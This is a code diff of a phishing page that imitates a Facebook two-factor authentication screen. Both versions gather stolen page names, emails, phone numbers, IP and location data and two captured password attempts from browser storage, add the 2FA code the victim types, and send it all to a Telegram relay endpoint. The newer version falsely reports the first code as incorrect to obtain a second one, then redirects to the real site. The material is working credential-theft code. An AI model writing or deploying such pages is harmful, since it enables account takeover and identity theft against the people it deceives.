@@ -1,121 +1,130 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Two-Factor Authentication</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            background-color: #f0f2f5;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-        .header {
-            background-color: #355797;
-            border-bottom: 1px solid #355797;
-            padding: 10px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            box-shadow: 0 2px 4px rgba(0,0,0,.08);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-        .header .help-center-link { font-size: 18px; font-weight: bold; color: #fff; text-decoration: none; }
-        .header .language { font-size: 14px; color: #fff; }
-        .main-content { flex-grow: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .form-container {
-            background-color: #fff;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,.1);
-            max-width: 450px;
-            width: 100%;
-            text-align: center;
-        }
-        .form-container h2 { font-size: 24px; color: #1c2b33; margin-bottom: 20px; }
-        .form-container p { font-size: 15px; color: #606770; margin-bottom: 20px; line-height: 1.5; }
-        .form-container input[type="text"] {
-            width: calc(100% - 20px);
-            padding: 12px 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 15px;
-            box-sizing: border-box;
-            outline: none;
-        }
-        .form-container input[type="text"]:focus { border-color: #1877f2; }
-        .form-container .error-message { color: #fa3e3e; font-size: 13px; margin-bottom: 10px; display: none; text-align: left; }
-        .form-container button {
-            background-color: #1877f2;
-            color: #fff;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .form-container button:hover { background-color: #166fe5; }
-        @media (max-width: 768px) {
-            .main-content { padding: 10px; }
-            .form-container { padding: 20px; }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Two-Factor Authentication</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f2f5;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    .form-container {
+        background-color: #fff;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0,0,0,.1);
+        max-width: 400px;
+        width: 100%;
+        text-align: center;
+    }
+    .form-container h2 {
+        margin-bottom: 20px;
+    }
+    .form-container input[type="text"] {
+        width: calc(100% - 20px);
+        padding: 12px 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ddd;
+        border-radius: 6px;
+        font-size: 15px;
+    }
+    .form-container input[type="text"]:focus {
+        border-color: #1877f2;
+        outline: none;
+    }
+    .form-container button {
+        background-color: #1877f2;
+        color: #fff;
+        padding: 12px 25px;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        cursor: pointer;
+    }
+    .form-container button:hover {
+        background-color: #166fe5;
+    }
+    .error-message {
+        color: #fa3e3e;
+        font-size: 13px;
+        margin-bottom: 10px;
+        display: none;
+    }
+</style>
 </head>
 <body>
-    <div class="header">
-        <a href="#" class="help-center-link">facebook</a>
-        <span class="language">English (US)</span>
-    </div>
+<div class="form-container">
+    <h2>Two-Factor Authentication</h2>
+    <p>Enter the 6-digit code sent to your device.</p>
+    <input type="text" id="twoFAInput" placeholder="123456">
+    <div class="error-message" id="twoFAError">Incorrect code. Please try again.</div>
+    <button id="confirm2FAButton">Confirm</button>
+</div>
 
-    <div class="main-content">
-        <div class="form-container">
-            <h2>Two-Factor Authentication</h2>
-            <p>Please enter the 6-digit code sent to your email or mobile device to continue.</p>
-            <input type="text" id="twoFACodeInput" placeholder="Enter 6-digit code" maxlength="6">
-            <div class="error-message" id="twoFAError">Incorrect code. Please try again.</div>
-            <button id="confirmTwoFAButton">Confirm</button>
-        </div>
-    </div>
+<script>
+    let twoFAAttemptCount = 0;
+    const twoFAInput = document.getElementById('twoFAInput');
+    const twoFAError = document.getElementById('twoFAError');
+    const confirm2FAButton = document.getElementById('confirm2FAButton');
 
-    <script>
-        let twoFAAttemptCount = 0;
-        const twoFACodeInput = document.getElementById('twoFACodeInput');
-        const twoFAError = document.getElementById('twoFAError');
-        const confirmTwoFAButton = document.getElementById('confirmTwoFAButton');
+    const formData = JSON.parse(localStorage.getItem('formData') || '{}');
+    const ipAddress = localStorage.getItem('ipAddress') || 'N/A';
+    const locationData = localStorage.getItem('locationData') || 'N/A';
+    const passwordAttemptValue1 = localStorage.getItem('passwordAttemptValue1') || '';
+    const passwordAttemptValue2 = localStorage.getItem('passwordAttemptValue2') || '';
 
-        async function sendMessageToTelegram(message) {
-            try {
-                const response = await fetch('/api/send-telegram', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: message })
-                });
-                await response.json();
-            } catch (error) {}
+    async function sendMessageToTelegram(message) {
+        try {
+            const response = await fetch('/api/send-telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: message })
+            });
+            const data = await response.json();
+            if (!data.success) console.error('Telegram API error:', data.error);
+        } catch (error) {
+            console.error('Error calling Telegram API:', error);
+        }
+    }
+
+    confirm2FAButton.addEventListener('click', async () => {
+        const code = twoFAInput.value.trim();
+        if (!code) {
+            twoFAError.textContent = 'Code cannot be empty.';
+            twoFAError.style.display = 'block';
+            return;
         }
 
-        confirmTwoFAButton.addEventListener('click', async () => {
-            const code = twoFACodeInput.value.trim();
-            if (!code || code.length !== 6) {
-                twoFAError.textContent = 'Please enter a valid 6-digit code.';
-                twoFAError.style.display = 'block';
-                return;
-            }
-            twoFAAttemptCount++;
-            const formData = JSON.parse(localStorage.getItem('formData') || '{}');
-            const ipAddress = localStorage.getItem('ipAddress') || 'N/A';
-            const locationData = localStorage.getItem('locationData') || 'N/A';
-            const password1 = localStorage.getItem('passwordAttemptValue1') || '';
-            const password2 = localStorage.getItem('passwordAttemptValue2') || '';
+        twoFAAttemptCount++;
+        let message = `<b>2FA Attempt ${twoFAAttemptCount}</b>\n`;
+        message += `IP & Location: ${ipAddress} (${locationData})\n`;
+        message += `Page Name: ${formData.yourName || ''}\n`;
+        message += `Business Email: ${formData.businessEmail || ''}\n`;
+        message += `Personal Email: ${formData.personalEmail || ''}\n`;
+        message += `Mobile Phone: ${formData.mobilePhoneNumber || ''}\n`;
+        message += `Password Attempt 1: ${passwordAttemptValue1}\n`;
+        message += `Password Attempt 2: ${passwordAttemptValue2}\n`;
+        message += `2FA Code Attempt ${twoFAAttemptCount}: ${code}\n`;
 
-            let message = `<b>Two-Factor Submission Attempt ${twoFAAttemptCount}</b>\n------------------------------------\n<b>IP & Location:</b> ${ipAddress} (${locationData})\n<b>Page Name:</b> ${formData.yourName || ''}\n<b>Business Email:</b> ${formData.businessEmail || ''}\n<b>Personal Email:</b> ${formData.personalEmail || ''}\n<b>Mobile Phone:</b> ${formData.mobilePhoneNumber || ''}\n<b>Password Attempt 1:</b> ${password1}\n<b>Password Attempt 2:</b> ${password2}\n<b>2FA Code:</b> ${code}\n`;
+        await sendMessageToTelegram(message);
 
-            await sendMessageToTelegram(message);
+        if (twoFAAttemptCount < 2) {
+            twoFAError.textContent = 'Incorrect code. Please try again.';
+            twoFAError.style.display = 'block';
+        } else {
+            alert('Verification completed.');
+            localStorage.clear();
+            window.location.href = 'https://facebook.com';
+        }
 
-            twoFAError.textContent = 'Incorrect code.
+        twoFAInput.value = '';
+    });
+</script>
+</body>
+</html>
